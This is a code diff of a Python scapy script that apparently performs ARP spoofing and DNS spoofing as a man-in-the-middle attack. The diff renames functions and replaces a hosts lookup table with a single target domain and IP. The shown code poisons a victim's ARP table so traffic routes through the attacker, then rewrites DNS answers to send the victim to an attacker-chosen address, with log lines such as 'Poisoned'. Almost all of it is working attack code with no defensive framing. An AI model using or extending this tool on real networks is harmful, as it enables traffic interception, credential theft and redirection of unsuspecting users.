@@ -1,8 +1,6 @@
 import os
 import scapy.all as scapy
 
-from hosts import hosts
-
 def enable_ip_forwarding():
     """
     Enables IP forwarding for all operating systems
@@ -54,7 +52,7 @@ def get_mac(ip):
         print("\n No MAC address found.")
         return None
 
-def spoof(victim_ip, gateway, output):
+def modify_arp_table(victim_ip, gateway, output):
     """
     Spoofs the ARP table of the victim
     As the result, target MAC address will be changed to our MAC address
@@ -79,7 +77,7 @@ def spoof(victim_ip, gateway, output):
         attacker_mac = scapy.ARP().hwsrc
         print(f"\n [+] Sent to {victim_ip} : {gateway} is at {attacker_mac}", end="")
 
-def restore(dest_ip, source_ip, output):
+def restore_arp_table(dest_ip, source_ip, output):
     """
     Restores ARP tables to their correct state
     Note: The correction packet will be sent 5 times to ensure host has received 
@@ -94,7 +92,7 @@ def restore(dest_ip, source_ip, output):
     if output:
         print(f"\n[+] Sent to {dest_ip}: {source_ip} is at {source_mac}", end="")
     
-def process(packet, output):
+def process_packet(packet, domain, host, output):
     """
     Processes the packet received to start modifying it
 
@@ -109,17 +107,17 @@ def process(packet, output):
     sPacket = scapy.IP(packet.get_payload())
 
     # Step 2
-    if sPacket.haslayer(DNSRR):
-        if (output):
+    if sPacket.haslayer(scapy.DNSRR):
+        if output:
             print("\n [+] Original: ", sPacket.summary())
 
         try:
             # Step 3
-            sPacket = modify(sPacket, output)
+            sPacket = modify_packet(sPacket, domain, host)
         except IndexError:
             pass
 
-        if (output):
+        if output:
             print("\n [+] Poisoned: ", sPacket.summary())
 
         # Step 4
@@ -128,7 +126,7 @@ def process(packet, output):
     # Step 5
     packet.accept()
 
-def modify(packet, output):
+def modify_packet(packet, domain, host):
     """
     Modifies the packet received
     It will change the DNSRR based on our poisoned mapping
@@ -141,21 +139,21 @@ def modify(packet, output):
     """
 
     # Step 1
-    domain = packet[DNSQR].qname
+    qname = packet[scapy.DNSQR].qname
 
     # Step 2
-    if domain not in hosts:
-        print(f"\n [+] Domain {domain} not in the list.", end="")
+    if domain not in qname:
+        print(f"\n [+] Domain {qname} not in the list.", end="")
         return packet
 
     # Step 3
-    packet[DNS].an = scapy.DNSRR(rrname=domain, rdata=hosts[domain])
-    packet[DNS].ancount = 1
+    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=host)
+    packet[scapy.DNS].ancount = 1
     
-    del packet[IP].len
-    del packet[IP].chksum
-    del packet[UDP].len
-    del packet[UDP].chksum
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.UDP].len
+    del packet[scapy.UDP].chksum
 
     return packet
     
